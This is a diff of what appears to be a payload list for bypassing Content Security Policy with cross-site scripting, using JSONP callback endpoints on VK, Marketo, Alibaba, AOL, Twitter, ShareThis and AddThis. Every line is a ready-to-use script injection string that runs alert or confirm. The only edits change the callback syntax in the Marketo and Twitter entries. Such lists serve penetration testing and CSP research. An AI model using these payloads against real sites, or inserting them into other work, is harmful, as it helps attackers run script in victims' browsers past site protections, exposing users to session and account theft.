@@ -11,8 +11,8 @@
 #VK.com:
 "><script+src="https://api.vk.com/method/wall.get?callback=alert(1337)"></script>
 #Marketo.com
-"><script+src="http://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>
-"><script+src="http://app-e.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>
+"><script+src="http://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert"></script>
+"><script+src="http://app-e.marketo.com/index.php/form/getKnownLead?callback=alert"></script>
 #AlibabaGroup:
 "><script+src="https://detector.alicdn.com/2.7.3/index.php?callback=alert(1337)"></script>
 "><script+src="https://suggest.taobao.com/sug?callback=alert(1337)"></script>
@@ -35,9 +35,9 @@
 "><script+src="https://ui.comet.aol.com/?module=header%7Cleftnav%7Cfooter&channel=finance&portfolios=true&domain=portfolios&collapsed=1&callback=confirm(9)//jQuery21307555521146732187_1538371213486&_=1538371213487"></script>
 "><script+src="http://portal.pf.aol.com/jsonmfus/?service=myportfolios,&porttype=1&portmax=100&callback=confirm(9)//jQuery1710788849030856973_1538354104695&_=1538354109053"></script>
 #Twitter.com:
-"><script+src="http://search.twitter.com/trends.json?callback=alert()"></script>
-"><script+src="https://twitter.com/statuses/user_timeline/yakumo119info.json?callback=confirm()"></script>
-"><script+src="https://twitter.com/status/user_timeline/kbeautysalon.json?count=1&callback=confirm()"></script>
+"><script+src="http://search.twitter.com/trends.json?callback=alert"></script>
+"><script+src="https://twitter.com/statuses/user_timeline/yakumo119info.json?callback=confirm"></script>
+"><script+src="https://twitter.com/status/user_timeline/kbeautysalon.json?count=1&callback=confirm"></script>
 #Others:
 "><script+src="https://www.sharethis.com/get-publisher-info.php?callback=alert(1337)"></script>
 "><script+src="https://m.addthis.com/live/red_lojson/100eng.json?callback=alert(1337)"></script>
